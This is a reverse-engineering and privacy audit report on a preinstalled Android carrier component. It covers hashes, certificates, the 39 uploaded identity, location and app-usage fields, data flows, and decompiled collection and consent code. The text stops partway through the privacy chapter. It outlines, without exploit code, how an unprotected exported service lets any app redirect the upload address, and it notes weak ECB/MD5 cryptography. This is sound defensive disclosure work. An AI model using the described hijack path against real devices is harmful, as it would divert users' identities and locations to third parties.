# SystemHelper — Reverse Engineering and Security Audit Report

**Language:** English (US) · [中文](SystemHelper_Audit-Report.md) · [Русский](SystemHelper_Audit-Report.ru-RU.md)

| Item | Content |
|---|---|
| Report version | Consolidated report v1.0 (merges 5 source documents) |
| Target | `SystemHelper_1.2-20221110.apk` |
| Package / version | `com.mobiletools.systemhelper` / `1.2-20221110` (versionCode 3) |
| File size | 1,762,193 bytes |
| MD5 | `a78da3f746597509ab61054689a65353` |
| SHA-256 | `6658c4be127bdf57ae276a91ae686a9fe26e65f17ee3ba5dec91c61d51fee3b4` |
| Signing certificate | `CN=bbkmobile.com.cn, OU=IQOO, O=BBK, C=CN` (platform-level, CA:true, SHA1withRSA/2048) |
| Method | Pure static analysis (JADX class-by-class decompilation, DEX structure analysis, resource table parsing, certificate parsing). No network requests were made to any target server. |
| Audit period | 2026-11-14 through 2026-11-16 |
| Overall conclusion | Privacy: **systematic infringement**. Security: **the upload channel can be hijacked by any application**. |

---

# Chapter 0 — How to Read This Report

## 0.1 Composition

This report consolidates five source documents. Every technical claim is traceable.

| Source document | Original lines | Merged into |
|---|---|---|
| `SystemHelper_安全审计报告.md` (v1) | 790 | Chapter 6, Appendix A/E |
| `SystemHelper_审计报告_v2_隐私与自身安全.md` | 886 | Chapter 5 framework, Chapter 7 |
| `SystemHelper_隐私影响评估报告.md` | 660 | Chapter 5 (ten perspectives) |
| `核心代码索引.md` | 306 | Appendix A |
| `核实报告_录屏与APK上传.md` | 307 | **Chapter 8 (merged in full)** |

All source documents remain in `audit/`. This report is not a concatenation — each fact appears once, taken from whichever version stated it most completely and accurately.

## 0.2 Evidence Grading

Every conclusion is tagged with an evidence strength. This is the basis for judging reliability:

| Tag | Meaning | How to use it |
|---|---|---|
| `[A]` | **Directly proven** by APK code, resources, or the manifest. Anyone can reproduce. | Cite as fact |
| `[B]` | **Strong inference** from code logic, with stated premises. | Cite, but note it is an inference |
| `[C]` | Requires server-side or runtime data to confirm. **Not verifiable by this report.** | Do not cite as a conclusion |
| `[D]` | **No evidence.** This report makes no claim. | Not an allegation |

**Tagging convention:** the body of this report quotes decompiled code extensively. **Any conclusion accompanied by a reproducible code snippet is `[A]`** and is not tagged individually. Tags are reserved for cases where strength needs explicit emphasis — particularly `[C]` and `[D]`, which mark the boundary of what this report cannot prove.

## 0.3 Three Self-Imposed Constraints

1. **Unfavorable and favorable evidence are both listed** — see 5.12 "Counter-Evidence" and 8.6 "Corrections Favorable to the Vendor".
2. **No motive is inferred** — the report judges "is this compliant" and "does this constitute infringement", not "was this malicious".
3. **No scope inflation** — conclusions apply only to devices shipping this APK version, and are not extended to the vendor's other products or the carrier's other services.

## 0.4 One Prerequisite Statement

> This report **made no network requests to `dm.wo.com.cn`**. How the server handles the data is entirely unknown.

Therefore every judgment involving server-side behavior (whether data is joined with subscriber records, shared with device vendors, used for marketing, transferred abroad, or has ever leaked) is tagged `[C]` and **excluded from the conclusions**.

## 0.5 Navigation

| Looking for | Go to |
|---|---|
| Conclusions and risk statistics | Chapter 1 |
| What this software is, who made it | Chapter 3 |
| What data is collected | Chapter 4 |
| Privacy impact (legal perspective) | Chapter 5 |
| Technical security flaws (attacker perspective) | Chapter 6 |
| How the two layers amplify each other | Chapter 7 |
| "Does it record the screen?" "Does it upload APKs?" | **Chapter 8** |
| Is it lawful | Chapter 9 |
| How to fix it | Chapter 10 |
| What users can do now | Chapter 11 |
| Where the code is | Appendix A |
| What the 815 classes are | Appendix B |

---

# Chapter 1 — Executive Summary

## 1.1 One-Sentence Conclusion

This is a **device management component preinstalled on China Unicom–customized handsets**. Without the user's knowledge, without any way to refuse, and without any way to disable it, it periodically collects both SIM slots' identity data, cell-tower location, and the full list of installed applications with their usage time and traffic, and uploads them to a carrier server. **Its upload channel can be rewritten by any ordinary application on the device, redirecting that data to a third party.**

## 1.2 Three Levels

**Level one — what it does (privacy)**

A single 39-field record contains both slots' IMEI, IMSI, ICCID, phone number, cell ID and location area code, VoLTE/5G state, public IP, RAM and storage capacity, and — for **every installed application** — package name, display name, foreground usage time, and per-SIM traffic. Base data is uploaded every 24 hours; the app inventory every 7 days; and a silent first upload fires 4 minutes after boot.

**Level two — how fragile it is (security)**

The service carrying this logic, `RegisterHelperService`, declares `exported="true"` but sets **no `android:permission`**. Its exposed Binder method `a(String)` writes directly to the upload server address. One bind by any application is enough to redirect all subsequent data — no permission, no root, no user tap required.

**Level three — whether it is lawful (legal)**

None of the six statutory legal bases holds. Disclosure coverage is 23% and the text was never displayed. All four elements of valid consent fail. Zero of the ten statutory data-subject rights is implemented. This constitutes civil infringement; administrative violation is highly likely; criminal liability is unsupported by current evidence.

## 1.3 Risk Register (18 items)

### Privacy (8)

| ID | Issue | Severity | Core evidence |
|---|---|---|---|
| P-01 | Disclosure and consent mechanisms are nominal | **Critical** | Text exists only in `resources.arsc`; no UI references it; `f.g` defaults to `true` |
| P-02 | Collection exceeds the minimum-necessary scope | **Critical** | 5 of 12 field categories have no causal link to the stated purpose (42%) |
| P-03 | Silent upload at boot; periodic wakeups | High | `priority=2147483647`, 4-minute delay, Doze penetration |
| P-04 | Recipient, purpose, retention, sharing all undisclosed | High | No in-app explanation; certificate subject `O=UNICOM` |
| P-05 | No ability to disable, withdraw, delete, or uninstall | High | 0 of 10 rights implemented |
| P-06 | Sensitive data stored in plaintext | High | `history` 100 rows + `signal` 500 rows, neither encrypted |
| P-07 | Forcibly modifies the system VoLTE setting | Medium | Reflective call to `setAdvancedCallingSettingEnabled(true)` |
| P-08 | Elevated risk in specific scenarios | Medium | Minors, enterprise devices, second-hand handsets |

### Security (12)

| ID | Issue | Severity | CVSS approx. |
|---|---|---|---|
| S-01 | Exported service without authentication; upload channel hijackable | **Critical** | 9.1 |
| S-02 | Cleartext HTTP end to end | **Critical** | 7.0 |
| S-03 | Cryptographic misuse (key = MD5(plaintext), ECB) | **Critical** | 6.3 |
| S-04 | Platform-level CA certificate + sharedUserId | **Critical** | — |
| S-05 | Plaintext at rest + MODE_WORLD_READABLE | High | 5.9 |
| S-06 | Plaintext PII written to logcat; switch can be flipped remotely | High | 6.6 |
| S-07 | Over-broad exported component surface | Medium | — |
| S-08 | Reliance on private AIDL; no signature check before binding | Medium | — |
| S-09 | No integrity verification; freely repackageable | Medium | — |
| S-10 | SHA-1 digests; 28-year key rotation gap | Low | — |
| S-11 | Code defects (NPEs, dead branches, empty methods) | Low | — |
| S-12 | No validation of external input (IP echo) | Low | — |

**Total: 4 Critical / 5 High / 5 Medium / 4 Low.**

## 1.4 The Most Dangerous Combination

No single item tells the whole story. The real risk comes from three stacked together:

```
P-02 (collects a complete identity and behavior profile across 39 fields)
  × S-01 (the upload address can be rewritten by any application)
  × S-02 (the link is cleartext)
= any harmless utility with a few hundred thousand installs
  can silently take over every user's verified identity,
  location, and behavioral profile on that device.
```

## 1.5 External Rumor Verification

| Allegation | Verdict | Basis (see Chapter 8) |
|---|---|---|
| Records the screen | **Not supported** | All four stages of screen recording (authorization / capture / encoding / transfer) are absent; no dynamic code loading or native library could bypass static analysis |
| Uploads all APK package names | **Supported** | `getInstalledApplications(0)` + `pkgName` + usage time + per-SIM traffic, every 7 days |
| Uploads APK files | **Not supported** | No `sourceDir`/`ZipFile`; no multipart; the body is always a single JSON |

## 1.6 Return on Investment

Of the 18 findings, **three cost under 8 person-days combined and eliminate 80% of the actual risk**:

| Measure | Effort | Risk eliminated |
|---|---|---|
| S-01 disable the exported service (a one-line manifest change) | **0.5 person-day** | The single most dangerous path |
| S-02 HTTPS end to end + certificate pinning | 2 person-days | Link interception |
| P-02 remove app-inventory and cell-tower collection | 5 person-days | The bulk of over-collection |

**S-01 is the only case here where a one-line configuration change removes a critical vulnerability.** It should be the first priority.

---

# Chapter 2 — Target and Methodology

## 2.1 Basic Facts

```
Package    : com.mobiletools.systemhelper
Version    : 1.2-20221110 (versionCode 3)
Size       : 1,762,193 bytes
minSdk     : 24  /  targetSdk: 33  /  compileSdk: 33
DEX        : classes.dex (1,171,504 bytes, single dex)
Classes    : 815 across 192 packages
Native libs: none (.so count = 0)
assets     : pub.cer only (1 KB)
Hardening  : none (no packer, no VMP, no Java2C)
Obfuscation: yes (R8; class and member names renamed)
```

## 2.2 Toolchain

| Stage | Method |
|---|---|
| Decompilation | JADX (MCP integration), class by class |
| Cross-references | JADX xrefs (method-level call graph) |
| DEX strings | Binary regex extraction (URLs, `ro.*`, private package names, API class names) |
| Resources | `resources.arsc` string pool, parsed entry by entry |
| Signing | `keytool -printcert`, APK Signing Block magic check |
| Certificates | `openssl x509` (DER parsing, key strength) |
| Behavior verification | Locally constructed requests against a mock server (Appendix D) |

## 2.3 Coverage: Distribution of the 815 Classes

After class-by-class decompilation, the 815 classes split into two groups:

| Category | Count | Notes |
|---|---|---|
| **First-party business code** | **~111** | `b.c.a.a` (59 — device info readers and vendor adapters), `b.c.a.b` (15 — infrastructure), `com.mobiletools.systemhelper.*` (30 — business logic and components), AIDL (7) |
| Third-party libraries | ~704 | `android.support.*`, `android.arch.*`, `androidx.*`, plus **AppCompat code renamed by R8 into `a.a.a.*` / `a.b.*`** |

> **An important correction:** the first pass misclassified `a.b.*` and `a.a.a.*` as first-party obfuscated code. Opening them class by class confirmed they are AndroidX/AppCompat — `a.b.c.a.a` is `ContextCompat`, `a.b.c.g.a` is `AbsSavedState`, `a.b.b.a.a` is an `R.attr` constant array, `a.b.d.a.a` is the `R.styleable` constant table. The actual business code is about 111 classes, all under `b.c.a.*` and `com.mobiletools.*`. The full breakdown is in Appendix B.

## 2.4 Is String Scanning Sufficient?

A hard constraint of the DEX format makes class-name scanning **complete** for the question "does this call a given API?":

> Every method invocation must be registered in `method_ids`, and `method_ids` references class and method names in `string_ids`. **Therefore, if the code calls `MediaProjectionManager`, `SurfaceControl.screenshot`, or reflectively uses the string `"android.view.SurfaceControl"`, that string must appear in `classes.dex`.**

The only three ways to bypass this constraint were all checked and are empty:

| Bypass | Check | Result |
|---|---|---|
| Dynamic loading of external dex | `DexClassLoader` / `PathClassLoader` / `InMemoryDexClassLoader` / `dalvik/system` / plugin frameworks | **All zero** |
| Native implementation | `.so` count, `loadLibrary` | **0 .so files, 0 calls** |
| Server-issued commands | Not executable without a local implementation | N/A |

Additionally, `Class.forName` appears exactly once, loading `SystemProperties` and various `TelephonyManager` classes (`ColorOSTelephonyManager`, `HwTelephonyManager`, `MzTelephonyManager`, `MSimTelephonyManager`, `TelephonyManagerEx`, `DmUnicomAbsTelephonyManager`) — **none related to display or imaging**.

## 2.5 Limitations (4)

1. **No dynamic analysis.** No physical device or emulator was available; traffic was not captured. All conclusions rest on static decompilation.
2. **No requests to the server.** The processing logic at `dm.wo.com.cn` is entirely unknown; related judgments are tagged `[C]`.
3. **Decompilation has inherent distortion.** JADX fails on control-flow-flattened methods — this sample has 5 (`RegisterIntentService.onHandleIntent`, `SIMStateReceiver.onReceive`, `b.c.a.a.b1#a`, `b.c.a.a.h0#a`, and several large methods). These were reconstructed from smali semantics and flagged in place.
4. **Other preinstalled components cannot be excluded.** Carrier-customized handsets commonly ship 10–30 preinstalled apps; this report covers one APK only.

---

# Chapter 3 — Application Profile

## 3.1 What This Software Is

**A device management (DM) component for China Unicom–customized handsets.**

Five independent lines of evidence:

| # | Evidence | Strength |
|---|---|---|
| 1 | Upload domain `dm.wo.com.cn:18080` ("wo" is Unicom's consumer brand), endpoint `/registerv3` | `[A]` |
| 2 | Hard-coded Unicom MCC/MNC values `46001 / 46006 / 46009` used to decide "is this a Unicom network" | `[A]` |
| 3 | **The certificate in `assets/pub.cer` has subject `C=CN, ST=BJ, L=BJ, O=UNICOM, OU=UNICOM, CN=UNICOM`** — the encryption public key is issued in China Unicom's name | `[A]` |
| 4 | A built-in mapping table covering 200+ models and 50+ vendors | `[A]` |
| 5 | Platform-level signature (`O=BBK, OU=IQOO`) + `sharedUserId` + preinstalled distribution | `[A]` |

Item 3 is the hardest documentary evidence in this report — it is not an inference from a domain name, but a direct statement in the public key used for encryption.

## 3.2 Technical Architecture

```
com.mobiletools.systemhelper (business layer; class names unobfuscated)
├── Activity/TestActivity            Exported entry point; shows device info, requests permissions
├── control/
│   ├── DMApplication                Application entry
│   ├── OnBootReceiver               Boot broadcast (exported, priority 2147483647)
│   ├── ScheduleRegisterReceiver     24h periodic task
│   ├── AppInfoRegisterReceiver      7d app-inventory task
│   ├── SIMStateReceiver             SIM change listener (exported)
│   ├── ConnectStateReceiver         Network listener (exported)
│   ├── a / b                        PhoneStateListener / TelephonyCallback (includes GPS capture)
│   ├── c                            Data model (40 fields, 39 uploaded)
│   ├── d                            IPv4/IPv6 collection thread
│   ├── e                            App inventory collection thread
│   ├── f                            SignalInfo thread (empty run(); effectively inert)
│   └── g                            Upload thread (encryption + HTTP POST)
└── service/
    ├── RegisterHelperService        **Exported AIDL service (no permission)** ← primary risk
    ├── RegisterIntentService        Vendor AIDL binding (Gree / Nubia)
    └── RegisterJobService           JobScheduler (protected by BIND_JOB_SERVICE)

b.c.a.a.* (device info readers, 59 classes)
├── c                                Base class (getImei / getSubscriberId / cell / VoLTE)
├── f1                               Factory + model routing (200+ branches)
└── a ~ z0                           50+ vendor adapter subclasses

b.c.a.b.* (infrastructure, 15 classes)
├── a   Alarm scheduling   b   AppInfo model      c   Crypto (MD5/AES)
├── d   SQLite(history)    e   HTTP GET           f   Global constants
├── g   HTTP POST          h   Field masking      i   Memory/storage collection
├── j   Logging            k   RSA                l   SharedPreferences
├── m   SQLite(signal)     n   Signal model       o   Reflection helper

b.a.b.a.a / b.b.a (vendor-private AIDL: Gree / Nubia)
```

## 3.3 Components and Permissions

### Exported Components (5, none protected)

| Component | Type | Risk |
|---|---|---|
| `service.RegisterHelperService` | Service | **Critical** — can rewrite the upload address |
| `Activity.TestActivity` | Activity | Medium — permission phishing, information disclosure |
| `control.OnBootReceiver` | Receiver | Medium — can trigger collection |
| `control.SIMStateReceiver` | Receiver | Medium |
| `control.ConnectStateReceiver` | Receiver | Low |

The declared `com.mobiletools.systemhelper.permission` (`protectionLevel="signature"`) is **referenced by no component** — a completely ineffective safeguard.

### Declared Permissions (10)

| Permission | Actual use | Necessary? |
|---|---|---|
| `INTERNET` | Upload | Yes |
| `ACCESS_NETWORK_STATE` | Network state checks | Yes |
| `READ_PHONE_STATE` | IMEI/IMSI/network type | Partially |
| `READ_PRIVILEGED_PHONE_STATE` | Privileged read of all subscriber info | No — excessive |
| `ACCESS_FINE/COARSE_LOCATION` | **Fused location (1s / 10m); coordinates written to SignalInfo** | Real use (gated by `f.e`, off by default) |
| `ACCESS_BACKGROUND_LOCATION` | Background counterpart of the above | Pairs with location capture |
| `PACKAGE_USAGE_STATS` | Per-app foreground time | No — excessive |
| `QUERY_ALL_PACKAGES` | Enumerate all installed apps | No — excessive |
| `READ_EXTERNAL_STORAGE` | No corresponding read found | Suspected redundant |
| `SCHEDULE_EXACT_ALARM` | Doze penetration | Improper use |

**Tally: 2 necessary, 3 partially, 5 excessive.**

## 3.4 Signature and Root of Trust

```
Subject       : EMAILADDRESS=bbktel@bbktel.com, CN=bbkmobile.com.cn,
                OU=IQOO, O=BBK, L=Dongguan View, ST=Guangdong, C=CN
Serial        : b153730d8a352539
Validity      : 2012-09-25 → 2040-02-11 (28 years)
Algorithm     : SHA1withRSA / 2048 bit
Extensions    : BasicConstraints CA:true (PathLen unlimited)
SHA-256       : BC:C3:5D:...:4F:0C:02
```

Three problems:

1. **The signing key is a CA key** (`CA:true`). Reusing an application signing key as a CA key is a key-management anti-pattern; the blast radius extends far beyond one app.
2. **The platform key is widely circulated.** The subject details match the publicly circulating vivo/BBK platform signing key, which has been repackaged repeatedly in third-party ROMs and flashing packages.
3. **28-year validity** — far beyond any reasonable rotation cycle.

> Note: the APK contains a v2/v3 signing block (`APK Sig Block 42` present), so it is **not** vulnerable to the classic Janus attack (CVE-2017-13156).

## 3.5 Upload Public Key

```
File          : assets/pub.cer (DER-encoded X.509)
Subject       : C=CN, ST=BJ, L=BJ, O=UNICOM, OU=UNICOM, CN=UNICOM
Signature alg : sha256WithRSAEncryption
Validity      : 2019-05-24 → 2119-04-30 (**100 years**)
Public key    : **1024-bit RSA**
```

**1024-bit RSA is no longer considered secure** (NIST SP 800-57 has discouraged it for new systems since 2013; PCI DSS prohibits it), and **a 100-year rotation gap** means that if the private key ever leaks, the exposure window is a century. This also explains a detail noted later: the signature is 128 bytes rather than 256.

## 3.6 Supply-Chain Disclosure

`b.c.a.a.f1#c()` maintains a static `Build.MODEL → vendor code` map covering 200+ models:

```java
f583a.put("V1911A", "vivo");   f583a.put("M2001J2C", "Xiaomi");
f583a.put("PCKM00", "OPPO");   f583a.put("EVR-AN00", "HUAWEI");
f583a.put("SM-G9750", "samsung"); f583a.put("NX659J", "nubia");
...
```

This is effectively a **carrier-customized model list** (including 5G handsets, tablets, and industry terminals) — supply-chain-sensitive information distributed publicly with the APK. It also happens to be a lookup table for internal-test devices from OPPO (`PCKM00` series) and Xiaomi (`M2001J2C` series).

---

# Chapter 4 — What Is Collected

## 4.1 The 39 Uploaded Fields

The data model `com.mobiletools.systemhelper.control.c` has 40 member fields; **39 are serialized into the upload JSON** (the 40th is an internal cache):

| Category | Fields | What can be identified or inferred |
|---|---|---|
| **Device (7)** | `Manuf`, `Model`, `HWVersion`, `SWVersion`, `OS`, `OSVersion`, `DeviceType` | Model, batch, ROM version, whether it is a carrier-customized unit |
| **SIM 1 (10)** | `IMEI1`, `ICCID1`, `IMSI1`, `MSISDN1`, `MNC1`, `NCLS1`, `CellID1`, `LAC1`, `VolteEnabled1`, `5GEnabled1` | Device identifier + SIM identifier + phone number + location + radio configuration |
| **SIM 2 (10)** | `IMEI2`, `ICCID2`, `IMSI2`, `MSISDN2`, `MNC2`, `NCLS2`, `CellID2`, `LAC2`, `VolteEnabled2`, `5GEnabled2` | Same; dual-SIM users can be linked to two identities |
| **Network (6)** | `AccType`, `IPv4`, `IPv6`, `DataSlot`, `SignalInfo`, `SubType` | Access type, public IP, default data SIM; **`SubType` is actually `{RAM, ROM, FREE}`**; **`SignalInfo` carries RSRP/SINR/RSRQ + cellid + LAC + timestamp + coordinates** |
| **App inventory (1 array)** | `AppInfo[]`: `appLabel`, `pkgName`, `runTime`, `tx1`, `rx1`, `tx2`, `rx2`, `totalData1`, `totalData2`, `totalDataWiFi` | What is installed, how long it is used, how much traffic each consumes |
| **Metadata (5)** | `RegType`, `SpecVersion`, `RegVersion`, `Time`, `History[]` | Trigger type, version, timestamp, historical records |

## 4.2 This Is Not "Device Information" — It Is Information About a Person

Of the 39 fields, only 7 describe the device itself — **18%**.

The other 32 (**82%**) describe:

- **The person holding it** — phone number, SIM identity (IMSI/ICCID)
- **Where that person is** — cell ID and location area code, public IP, optional GPS coordinates
- **What that person does** — which apps are installed, how long each is used, how much traffic each consumes on which SIM

Calling this dataset "device information" is the most consequential mischaracterization in this report.

## 4.3 Sensitivity Assessment

Under Article 28 of China's Personal Information Protection Law (PIPL) — sensitive personal information is data whose leakage or unlawful use is likely to harm personal dignity or endanger personal or property safety:

| Field | Sensitive? | Reason |
|---|---|---|
| `IMEI1/2` | **Yes (specific identity)** | Device-unique identifier, bindable to subscriber records |
| `IMSI1/2`, `ICCID1/2` | **Yes (specific identity)** | SIM-unique identifiers, directly tied to the account holder |
| `MSISDN1/2` | **Yes (specific identity)** | Phone numbers are the vehicle of real-name registration |
| `CellID1/2` + `LAC1/2` | **Yes (movement trajectory)** | Cell-level positioning; with History, a path can be reconstructed |
| `SignalInfo.location` | **Yes (movement trajectory)** | GPS coordinates in plaintext |
| `AppInfo[]` | **Yes (infers religion / health / finance)** | Once aggregated, reveals several categories listed in Article 28 |

**Conclusion: 13 fields are sensitive personal information under the statute** (12 across both SIM slots + `SignalInfo.location`), **plus one category — the app inventory — from which sensitive information can be inferred.**

## 4.4 Timing and Frequency

| Trigger | Interval | Content | Code |
|---|---|---|---|
| Boot | **4-minute delay** | Base data | `OnBootReceiver` + `b(ctx, 240000L)` |
| Periodic | **24 hours** | Base data | `f.y = 86400000` |
| Periodic | **7 days** | Base data + **full app inventory** | `f.z = 604800000` |
| SIM change | **6-minute delay** | Base data (only if ICCID actually changed) | `SIMStateReceiver` |
| Signal change | **every change** | RSRP/SINR + location (gated by `f.e`) | `control.b#onSignalStrengthsChanged` |

**Key detail:** the app inventory is not sent every 24 hours — only **every 7 days**. `RegType=S` goes through `f1.a(ctx,"S")`, which calls `new g(...)` directly; `cVar.K` (AppInfo) is null, so the JSON contains `"AppInfo":""`. Only `RegType=A` runs the `control.e` collector first.

Each trigger re-arms the next one, so the cycle is self-sustaining:

```java
// ScheduleRegisterReceiver.onReceive
b.c.a.b.a.d(f614a, l.b(context));   // re-arm before collecting
...collect and upload...
```

## 4.5 Full Data Flow

```
[BOOT_COMPLETED]  priority = 2147483647
      │
      ▼
OnBootReceiver.onReceive()
      │  b(ctx, 240000)                    ← 4-minute delay
      ▼
AlarmManager.setExactAndAllowWhileIdle()   ← penetrates Doze
      │
      ▼
f1.a(ctx, "F"/"B"/"S"/"A"/"T")
      │
      ├─ f1.c(ctx, cVar)    base data (vendor/model/ROM/network/IP)
      ├─ control.e thread   getInstalledApplications + UsageStats + NetworkStats
      ├─ b.c.a.a.c reader   dual-SIM IMEI/ICCID/IMSI/MSISDN/MNC/CellID/LAC/VoLTE
      ├─ b.c.a.b.i          RAM / ROM / FREE → SubType
      └─ control.b          SignalInfo (RSRP/SINR + GPS coordinates)
      │
      ▼
c.a()  →  JSONObject (39 fields, plaintext)
      │
      ├─ MD5(json) ──────────────► AES-128 key (!!)
      │        └─ RSA(pub.cer, MD5) ─► URL parameter sign
      ▼
AES/ECB/PKCS5Padding(json, key = MD5)
      │
      ▼
POST http://dm.wo.com.cn:18080/registerv3?ver=3.0&model=..&manuf=..&sign=..
     Content-Type: application/encrypted-json
      │
      ├─ 200 / 416 → success, clear the local queue
      └─ failure    → write to SQLite (history 100 rows / signal 500 rows, plaintext)
```

## 4.6 Local Retention

| Location | Content | Capacity | Encrypted |
|---|---|---|---|
| `databases/systemhelper` (table `history`) | Full device-info JSON | 100 rows | **No** |
| `databases/signalhelper` (table `signal`) | RSRP/SINR + cellid + LAC + timestamp + **coordinates** | **500 rows** | **No** |
| `shared_prefs/com_mobiletools_systemhelper_preference.xml` | Upload address, log switch, ICCID, intervals | — | `MODE_WORLD_READABLE` |
| logcat | Full plaintext JSON (when the switch is on) | ring buffer | **No** |

A correct setting: `allowBackup="false"` blocks the `adb backup` extraction path.

---

# Chapter 5 — Privacy: Impact on Users

## 5.1 Core Judgment for This Layer

Nothing in this layer requires an attacker. The moment the phone boots and a SIM is inserted, collection and upload have already begun and continue for the life of the device. The user neither knows what is happening nor has any means to stop it.

> This is not "a few features implemented carelessly". It is **a collection model fundamentally incompatible with the basic framework of personal information protection**: it assumes the user will not notice, will not refuse, and cannot exit.

## 5.2 P-01 — Disclosure and Consent Are Nominal 【Critical】

### 5.2.1 There Is, In Fact, Some Disclosure Text

Parsing the `resources.arsc` string pool entry by entry turns up five Chinese text fragments (the DEX contains **no Chinese privacy literals at all**):

```
运营商可能通过
或移动数据网络收集您的设备信息等数据
开启即视为同意联网
访问应用列表和定位
运营商服务
```

Reassembled, the sentence reads:

> **"The carrier may collect data such as your device information over [Wi-Fi] or mobile data. Enabling the service constitutes consent to network access, access to the app list, and location."**

### 5.2.2 Flaw One — The Disclosure Is Badly Incomplete

| Item that should be disclosed | Covered by the text? | What is actually collected | Gap |
|---|---|---|---|
| Device information | Yes, in general terms | Model, ROM, hardware version | Acceptable |
| App list | Yes, explicitly | **Also usage time and per-SIM traffic** | Undisclosed |
| Location | Yes, in general terms | **Cell ID/LAC plus optional GPS** | Precision undisclosed |
| IMEI | No | Both slots | **Undisclosed** |
| IMSI | No | Both slots | **Undisclosed** |
| ICCID | No | Both slots | **Undisclosed** |
| Phone number | No | Both slots | **Undisclosed** |
| RAM / storage capacity | No | RAM/ROM/FREE | **Undisclosed** |
| Recipient identity | No | `dm.wo.com.cn` (certificate `O=UNICOM`) | **Undisclosed** |
| Collection frequency | No | 24h / 7d / boot / SIM change | **Undisclosed** |
| Retention period | No | 100 + 500 local rows; server unknown | **Undisclosed** |
| Sharing / transfer | No | Unknown `[C]` | **Undisclosed** |
| User rights and how to exercise them | No | No channel | **Undisclosed** |

**Coverage: 3 of 13 required items = 23%. For the critical items (recipient / retention / rights), coverage is 0%.**

### 5.2.3 Flaw Two — The Text Has No Display Path

This is the most concrete and least defensible point in the report:

- The **only** custom UI in the APK is `res/layout/activity_test.xml`, whose entire content is one `TextView` hard-coded to the string `"Device Info"`.
- Traversing every binary XML under `res/`, **not one references `@string/`**.
- The DEX contains no Chinese privacy literals.
- The app has no onboarding page, no dialog, no settings page, no "About" page.

```xml
<!-- res/layout/activity_test.xml, in full (abridged) -->
<ScrollView ...>
    <TextView android:id="@+id/tv_device_info"
              android:text="Device Info"/>     <!-- the only text, and it is a placeholder -->
</ScrollView>
```

**The text is an orphaned resource. In this build there is no code path that can present it to a user.**

Article 17 of PIPL sets out seven disclosure obligations. The app fails both in form and in substance. And "compiled the text into the APK but chose not to show it" is, in a regulatory review, an aggravating factor rather than a mitigating one — it shows the developer knew disclosure was required and decided against it.

### 5.2.4 Flaw Three — The Consent Form Is Invalid

The text says "**enabling constitutes consent**" — a textbook **default / implied consent (opt-out)** arrangement.

But IMEI, IMSI, ICCID, and phone number are **sensitive personal information** under Article 28, and Article 29 requires **separate consent** plus an option to keep using basic functionality after refusing.

The global switch in code:

```java
// b.c.a.b.f
public static boolean g = true;                    // enabled by default

// control.g#run()
if (b.c.a.b.f.g) {
    a(b(this.c));                                  // collect and upload
    return;
}
b.c.a.b.d dVarA = b.c.a.b.d.a(...);
dVarA.a(this.c.a());                               // even when off, data goes into the local queue
dVarA.close();
j.a("RegisterThread", "User Permission Closed!");  // logs only; data is not discarded
```

Note the last lines: **even with the switch off, the data is still written to the local SQLite queue** — it is merely not uploaded immediately.

### 5.2.5 Flaw Four (Corrected Wording) — Consent Gating Varies by Device

This is the one finding favorable to the vendor, and the place where the first draft was too absolute.

**vivo adapter (`b.c.a.a.z0`) — genuine consent gating:**

```java
private boolean e(Context context) {
    boolean provisioned = Settings.Global.getInt(
            context.getContentResolver(), "device_provisioned", 0) == 1;
    b.c.a.b.j.a("DeviceInfoReaderVIVO", "isBootWizardCompleted: " + provisioned);
    if (provisioned) {
        return Settings.Secure.getInt(
                context.getContentResolver(), "operator_service_improve_plan", 0) == 1;
    }
    return false;
}

@Override
public void a(Context context, c cVar) {
    boolean granted = e(context);
    b.c.a.b.f.g = granted;
    if (!granted) {
        b.c.a.b.j.b("DeviceInfoReaderVIVO", "isUserPermissionOpen==false, do not read!");
        return;                                   // ← skips collection entirely
    }
    ...
}
```

**Baidu / Spreadtrum adapter (`b.c.a.a.b`):**

```java
private boolean d(Context context) {
    return Settings.Secure.getInt(
            context.getContentResolver(), "dm_user_agreement", 0) == 1;
}
```

**Coverage across the package** (searched and confirmed class by class):

| Gate | Classes | Nature | Effective? |
|---|---|---|---|
| `Settings.Secure.operator_service_improve_plan` | 6 (incl. vivo `z0`) | Carrier service improvement program | Yes — skipping is real |
| `Settings.Secure.dm_user_agreement` | 2 (incl. Baidu `b`) | User agreement | Yes |
| `Settings.Global.device_provisioned` | 19 | Only checks that setup wizard finished | **No — not consent** |
| None | ~30 remaining | Uses the default `f.g = true` | **No gate at all** |

**Accurate conclusion:** it is not that "no device has a consent mechanism", but that **8 adapters have real consent, 19 have a weak check, and the rest have none**. Compliance assessment should be per-device. For the majority of uncovered devices, however, "enabled by default with no way to refuse" still holds.

### 5.2.6 Bundled Consent

Article 29 requires **separate consent** for sensitive personal information. This app bundles IMEI, IMSI, ICCID, phone number, cell location, and app inventory together with ordinary device model under **one switch** — the classic "all-or-nothing consent", invalid even where consent exists.

## 5.3 P-02 — Collection Exceeds Minimum Necessity 【Critical】

### 5.3.1 Field-by-Field Necessity

Measured against the stated purpose of "device registration, network capability identification, VoLTE/5G adaptation":

| Field | Direct relevance to purpose | Minimization alternative | Verdict |
|---|---|---|---|
| `Model` / `Manuf` | Direct (selects adapter branch) | None | Necessary |
| `OSVersion` | Direct | None | Necessary |
| `VolteEnabled` / `5GEnabled` | Direct | None | Necessary |
| `MNC` / `NCLS` | Direct | None | Necessary |
| `IMEI` | Indirect (device identifier only) | Random UUID or hash | Minimizable |
| `IPv4` / `IPv6` | Borderline (connectivity diagnostics) | Use and discard | Minimizable |
| `SignalInfo` (RSRP/SINR) | Borderline (network quality) | Carrier already has OSS data | Minimizable |
| `ICCID` | None | Slot index + carrier suffices | **Out of scope** |
| `IMSI` | None | Same | **Out of scope** |
| `MSISDN` | None | Carrier already holds the subscriber number | **Out of scope** |
| `CellID` / `LAC` | **None whatsoever** | Network optimization does not require terminal-reported cell IDs | **Out of scope** |
| `AppInfo[]` | **None whatsoever** | Should be removed entirely | **Severely out of scope** |

**Quantified: of 12 categories, 4 necessary, 3 minimizable, 5 out of scope (42%).**

### 5.3.2 The Technical Argument: Far Less Data Would Suffice

Android's own Device Owner mechanism identifies the model and network capability through `Build.MODEL`, `Build.VERSION.SDK_INT`, and `TelephonyManager.getNetworkType()` — **no IMEI, no app list, no cell information required**.

The GSMA terminal management specifications are likewise built around "capability negotiation", not "identity collection".

So "business need" cannot explain the collection of app inventory and cell location — there is **no causal relationship between these data and the stated purpose, only an incidental one** `[B]`.

### 5.3.3 The Three Most Intrusive Collections

**(1) Cell location enables trajectory reconstruction**

`CellID + LAC` identifies a cell sector, placing the user within a few hundred meters; combined with `History[]`, it reconstructs movement over time. This amounts to **location tracking without ever prompting for location access**.

